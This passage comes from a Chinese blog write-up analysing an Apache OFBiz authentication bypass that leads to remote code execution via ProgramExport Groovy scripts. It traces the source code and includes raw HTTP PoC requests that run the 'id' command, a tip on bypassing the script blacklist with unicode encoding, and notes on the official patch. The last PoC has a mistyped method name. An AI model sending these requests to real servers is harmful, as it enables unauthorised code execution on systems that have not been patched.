<p>这里的viewName是通过一个三目运算得来，<code>UtilValidate.isNotEmpty(overrideViewUri)</code>​overrideViewUri就是我们最开始获取到的ProgramExport了，所以这里肯定不为空。然后是<code>eventReturn == null || &quot;success&quot;.equals(eventReturn)</code>​这个判断，首先main获取到的eventReturn就为空，所以或运算得到就是true，最终<code>viewName</code>​被赋值为了<code>overrideViewUri</code>​，也就是ProgramExport了</p>
<p>跟进renderView方法,代码量还是有点多的，只截取几段关键性代码：</p>
<p>首先是ProgramExport的view配置信息的获取，在webtools的controllerxml中，ProgramExport的view设置为<code>&lt;view-map name=&quot;ProgramExport&quot; type=&quot;screen&quot; page=&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;/&gt;</code>​</p>
<p>而<code>EntityScreens.xml</code>​中的ProgramExport内容如下：</p>
<p>​<img src="/images/ofbizs1/image-20240816105858-vbcww2f.png" alt="image">​</p>
<p>ControllerConfig将这些内容全部解析之后存储起来，此时的render方法就会通过<code>getViewMapMap().get(xxxview)</code>​将其获取出来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> ConfigXMLReader.<span class="type">ViewMap</span> <span class="variable">viewMap</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            viewMap = (view == <span class="literal">null</span> ? <span class="literal">null</span> : getControllerConfig().getViewMapMap().get(view));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">            Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RequestHandlerException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"><span class="keyword">if</span> (viewMap.page == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!allowExtView) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RequestHandlerException</span>(<span class="string">&quot;No view to render.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nextPage = <span class="string">&quot;/&quot;</span> + oldView;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nextPage = viewMap.page;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;Rendering view [&quot;</span> + nextPage + <span class="string">&quot;] of type [&quot;</span> + viewMap.type + <span class="string">&quot;]&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">            <span class="type">ViewHandler</span> <span class="variable">vh</span> <span class="operator">=</span> viewFactory.getViewHandler(viewMap.type);</span><br><span class="line">            vh.render(view, nextPage, viewMap.info, contentType, charset, req, resp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ViewHandlerException e) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">throwable</span> <span class="operator">=</span> e.getNested() != <span class="literal">null</span> ? e.getNested() : e;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RequestHandlerException</span>(e.getNonNestedMessage(), throwable);</span><br><span class="line">        &#125;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>此时的nextpage就是<code>component://webtools/widget/EntityScreens.xml#ProgramExport</code>​这一段字符串，用来定位具体的page设置。之后跟进vh.render方法,内容比较多，也是按照关键性逻辑来讲。</p>
<p>首先是对<code>component://webtools/widget/EntityScreens.xml#ProgramExport</code>​这个资源项的解析，他首先要定位到<code>component://webtools/widget/EntityScreens.xml</code>​的具体位置，然后读取此xml文件的所有内容，进行循环匹配<code>ProgramExport</code>​的操作，并将其取出。具体的实现是通过<code>ScreenFactory.getScreenFromLocation</code>​实现，并将ProgramExport的具体内容封装成了modelScreen对象</p>
<p>​<img src="/images/ofbizs1/image-20240816152221-tnlhrte.png" alt="image">​</p>
<p>具体看一下ModelScreen的构造方法</p>
<p>​<img src="/images/ofbizs1/image-20240816152502-0tw2n1r.png" alt="image">​</p>
<p>最后初始化了一个<code>ModelScreenWidget</code>​的内部类Section，这个Section就是EntityScreensxml文件中各视图元素的具体内容，而Section中又封装了<code>ProgramExport</code>​路由的action属性</p>
<p>​<img src="/images/ofbizs1/image-20240816152714-oqf1udm.png" alt="image">​</p>
<p>这个action属性的具体内容如下，它包含了我们要执行的groovy脚本的具体地址。</p>
<p>​<img src="/images/ofbizs1/image-20240816152859-j63hvzv.png" alt="image">​</p>
<p>后续的内容就是ModelScreen调用Section的renderWidgetString方法，进而调用到AbstractModelAction子类Script的runAction方法，执行Groovy脚本</p>
<p>​<img src="/images/ofbizs1/image-20240816153222-o8sb4eu.png" alt="image">​</p>
<p>​<img src="/images/ofbizs1/image-20240816153304-a0dox4y.png" alt="image">​</p>
<p>​<img src="/images/ofbizs1/image-20240816153239-dk7zns6.png" alt="image">​</p>
<p>漏洞利用到这里就结束了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/main/ProgramExport HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8443</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Cookie: Phpstorm-63ee3e40=51a64c0d-a81d-4ebf-b733-34a7e8541a1d; 6WNw_2132_ulastactivity=cd70Mo4Rmnmx8E7unOmyCD7JqvsYbj%2BjlrK8Gil4OGaCByIkgJVt; 6WNw_2132_nofavfid=<span class="number">1</span>; XDEBUG_SESSION=PHPSTORM; M5N4_2132_ulastactivity=c561BiOMrreY5EPC0B6wLBzqsvErShDer4PT7j9ClqA8%2Ba%2B99dRv; M5N4_2132_lastcheckfeed=<span class="number">1</span>%7C1716190113; M5N4_2132_nofavfid=<span class="number">1</span>; cookieconsent_status=dismiss</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/png,image/svg+xml,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Length: 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">groovyProgram=throw new Exception(&#x27;id&#x27;.execute().text);</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/images/ofbizs1/image-20240816194840-q2oytf4.png" alt="image">​</p>
<p>‍</p>
<p>‍</p>
<h1 id="深入利用和其他"><a href="#深入利用和其他" class="headerlink" title="深入利用和其他"></a>深入利用和其他</h1><h2 id="编码绕过黑名单waf"><a href="#编码绕过黑名单waf" class="headerlink" title="编码绕过黑名单waf"></a>编码绕过黑名单waf</h2><p>首先就是Groovy脚本中是存在waf的</p>
<p>​<img src="/images/ofbizs1/image-20240816194947-rj7p9cw.png" alt="image">​</p>
<p>具体内容如下</p>
<p>​<img src="/images/ofbizs1/image-20240816194707-76jbfum.png" alt="image">​</p>
<p>这其实很容易绕过，有很多种方式，但是最为经典的还是用unicode去绕，因为本身java中字符串就是由unicode编码的，而我们传入的groovyProgram也是字符串形式。当然，如果不用unicode去绕过，也有很多绕过的方式，这里就不细讲，主要是关于groovy的相关知识。</p>
<p>‍</p>
<h2 id="鉴权思路总结"><a href="#鉴权思路总结" class="headerlink" title="鉴权思路总结"></a>鉴权思路总结</h2><p>在上文中我应该提到过，但是为了文章的结构性我没有在当时细讲，只是提了一嘴。这里就好好的分析一下</p>
<p>我们看到请求路由：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webtools/control/main/ProgramExport</span><br></pre></td></tr></table></figure>

<p>在doRequest方法中关于路由的截取处理的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="comment">//cname=&quot;webtools&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cname</span> <span class="operator">=</span> UtilHttp.getApplicationName(request); </span><br><span class="line">     </span><br><span class="line">	<span class="comment">//defaultRequestUri=&quot;main&quot;</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">defaultRequestUri</span> <span class="operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Servlet-API中自带的方法，path=&quot;main/ProgramExport&quot;</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPathInfo();</span><br><span class="line">	<span class="comment">//requestUri=&quot;main&quot;</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(path);</span><br><span class="line">	<span class="comment">//overrideViewUri=&quot;ProgramExport&quot;</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">overrideViewUri</span> <span class="operator">=</span> getOverrideViewUri(path);</span><br></pre></td></tr></table></figure>

<p>光从这几条代码和结果中看不出什么,接下来我们来看一下webtools模块下web.xml的内容：</p>
<p>对于总路由请求ControllerServlet的url-pattern的设置路由如下</p>
<p>​<img src="/images/ofbizs1/image-20240816200853-3ywz1c7.png" alt="image">​</p>
<p>也就是这一段url-pattern的值，限制了我们调用HttpRequest.getPathInfo()获取路由信息就会往control这一层之后去截取。这也是常用于 RESTful 风格的 API 路由，通过路由来动态获取请求信息。之后的<code>getRequestUri</code>​和<code>getOverrideViewUri</code>​方法，就是固定的将<code>main/ProgramExport</code>​这一段字符串按照<code>/</code>​进行分割，<code>RequestUri</code>​取前一个，<code>OverrideViewUri</code>​取后一个。</p>
<p>在此之后<code>RequestUri</code>​将作为RequestMaps的主要判断依据，从对应的Controller.xml中获取对应的路由配置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);</span><br></pre></td></tr></table></figure>

<p>具体看到<code>resolveURI</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Collection&lt;RequestMap&gt; <span class="title function_">resolveURI</span><span class="params">(ControllerConfig ccfg, HttpServletRequest req)</span> &#123;</span><br><span class="line">       Map&lt;String, List&lt;RequestMap&gt;&gt; requestMapMap = ccfg.getRequestMapMap();</span><br><span class="line">       Map&lt;String, ConfigXMLReader.ViewMap&gt; viewMapMap = ccfg.getViewMapMap();</span><br><span class="line">       <span class="type">String</span> <span class="variable">defaultRequest</span> <span class="operator">=</span> ccfg.getDefaultRequest();</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> req.getPathInfo();</span><br><span class="line">       <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(path);</span><br><span class="line">       <span class="type">String</span> <span class="variable">viewUri</span> <span class="operator">=</span> getOverrideViewUri(path);</span><br><span class="line">       Collection&lt;RequestMap&gt; rmaps;</span><br><span class="line">       <span class="comment">//最重要的就是这段if判断了，上文细讲过，产生的结果就是整个RequestMaps中存入的内容是&quot;main&quot;对应的路由信息，这里就不在赘述了。</span></span><br><span class="line">	<span class="keyword">if</span> (requestMapMap.containsKey(requestUri)</span><br><span class="line">               <span class="comment">// Ensure that overridden view exists.</span></span><br><span class="line">               &amp;&amp; (viewUri == <span class="literal">null</span> || viewMapMap.containsKey(viewUri) </span><br><span class="line">               || (<span class="string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))&#123;</span><br><span class="line">           rmaps = requestMapMap.get(requestUri);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">           rmaps = requestMapMap.get(defaultRequest);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           rmaps = <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> rmaps != <span class="literal">null</span> ? rmaps : Collections.emptyList();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而之后的RequestMap单个的获取，也仅仅只是从rmaps中遍历每一个requestmap，然后匹配到对应的map进行获取。对应到示例路由就是</p>
<p>​<img src="/images/ofbizs1/image-20240816205911-p12p5vw.png" alt="image">​</p>
<p>由于security标签中的auth属性值为false，所以当前取到的requestMap中<code>securityAuth</code>​属性值为false，从而也能绕过这一段鉴权逻辑。这也是Y4tacker师傅发现的该漏洞绕过鉴权的思路</p>
<p>​<img src="/images/ofbizs1/image-20240816210107-l6mjpfo.png" alt="image">​</p>
<p>然而requestMap的作用还不止这些，当走完处理requestMap的Event逻辑之后（有event就会率先执行event的内容，没有就直接往下走），要把结果返回出去。这里也就是涉及到了<code>&lt;response&gt;</code>​标签的作用，它的type为view，表示最后的返回结果要通过视图解析。</p>
<p>具体的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="literal">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">                renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br></pre></td></tr></table></figure>

<p>viewName被赋值为了overrideViewUri，也就是ProgramExport。再从webtools的.controller.xml中读取ProgramExport的view标签内容，发现它的page是一段加载路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;view-map name=<span class="string">&quot;ProgramExport&quot;</span> type=<span class="string">&quot;screen&quot;</span> page=<span class="string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>到后面的内容其实根据page的路径去读取EntityScreens.xml文件内容，并且定位到ProgramExport所对应属性值，加载groovy脚本。上文分析过就不细谈了。</p>
<p>所以我们最终利用的还是overrideViewUri</p>
<p>‍</p>
<h2 id="Groovy利用总结"><a href="#Groovy利用总结" class="headerlink" title="Groovy利用总结"></a>Groovy利用总结</h2><p>为什么最终利用到的GroovyPayload是<code>throw Exception(&quot;id&quot;.execuate().text)</code>​呢?</p>
<p>首先不论是哪种groovypayload，即使你直接<code>&quot;id&quot;.execuate().text</code>​传值过去都是没问题的，但是问题是我们需要有回显，也就是说当我们这么执行过后，sink的groovy脚本中是没有给我们把groovyshell.evaluate()的结果回显出来的,然后回到源码处</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shell.parse(groovyProgram)</span><br><span class="line">     shell.evaluate(groovyProgram)</span><br><span class="line">     recordValues = shell.getVariable(<span class="string">&quot;recordValues&quot;</span>)</span><br><span class="line">     xmlDoc = GenericValue.makeXmlDocument(recordValues)</span><br><span class="line">     context.put(<span class="string">&quot;xmlDoc&quot;</span>, xmlDoc)</span><br><span class="line"> &#125; <span class="keyword">catch</span>(MultipleCompilationErrorsException e) &#123;</span><br><span class="line">     request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"> &#125; <span class="keyword">catch</span>(groovy.lang.MissingPropertyException e) &#123;</span><br><span class="line">     request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"> &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">     request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"> &#125; <span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">     request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"> &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">     request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>最后有5段catch,每一段catch都会将我们的此次shell.evaluate的执行过程中遇到的exception全部当作结果回显出来,这也是为什么我们要指定<code>throw Exception</code>​,也就为了能够走到catch的情况中,回显.</p>
<h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><p>再来看一下官方具体怎么修的</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/31d8d7">https://github.com/apache/ofbiz-framework/commit/31d8d7</a></p>
<p>添加如下鉴权groovy代码</p>
<p>​<img src="/images/ofbizs1/image-20240817094112-jmhydp4.png" alt="image">​</p>
<p>​<img src="/images/ofbizs1/image-20240817094242-069vqsy.png" alt="image">​</p>
<p>具体的实现代码：</p>
<p>​<img src="/images/ofbizs1/image-20240818093845-24itm6m.png" alt="image">​</p>
<p>其实本质上就是从数据库中select出所有的有权限用户，然后匹配此时Groovy脚本中指定的<code>ENTITY_MAINT</code>​。这个值具体有没有默认存入数据库就没去看了，现在思考是否存在其他利用方式？</p>
<p>‍</p>
<h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p>最后贴一下poc，groovyProgram还是用unicode编码一下，这里我就按原始的来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/main/ProgramExport HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8443</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Cookie: Phpstorm-63ee3e40=51a64c0d-a81d-4ebf-b733-34a7e8541a1d; 6WNw_2132_ulastactivity=cd70Mo4Rmnmx8E7unOmyCD7JqvsYbj%2BjlrK8Gil4OGaCByIkgJVt; 6WNw_2132_nofavfid=<span class="number">1</span>; XDEBUG_SESSION=PHPSTORM; M5N4_2132_ulastactivity=c561BiOMrreY5EPC0B6wLBzqsvErShDer4PT7j9ClqA8%2Ba%2B99dRv; M5N4_2132_lastcheckfeed=<span class="number">1</span>%7C1716190113; M5N4_2132_nofavfid=<span class="number">1</span>; cookieconsent_status=dismiss</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/png,image/svg+xml,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Length: 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">groovyProgram=throw Exception(&quot;id&quot;.execuate().text)</span></span><br></pre></td></tr></table></figure>

<p>‍</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/post/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2024-08-29 21:00:56
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/ofbiz/" title="ofbiz">
                        #ofbiz
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/post/JDK%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87.html" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="toc-text">前置准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">具体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ControllerServlet"><span class="toc-text">ControllerServlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RequestHandler%E7%9A%84%E5%85%B7%E4%BD%93%E8%A7%A3%E6%9E%90"><span class="toc-text">RequestHandler的具体解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%80%A7%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96"><span class="toc-text">关键性参数获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">鉴权绕过分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E6%B8%B2%E6%9F%93"><span class="toc-text">结果渲染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E5%85%B6%E4%BB%96"><span class="toc-text">深入利用和其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95waf"><span class="toc-text">编码绕过黑名单waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-text">鉴权思路总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">Groovy利用总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#patch%E5%88%86%E6%9E%90"><span class="toc-text">patch分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">利用总结</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
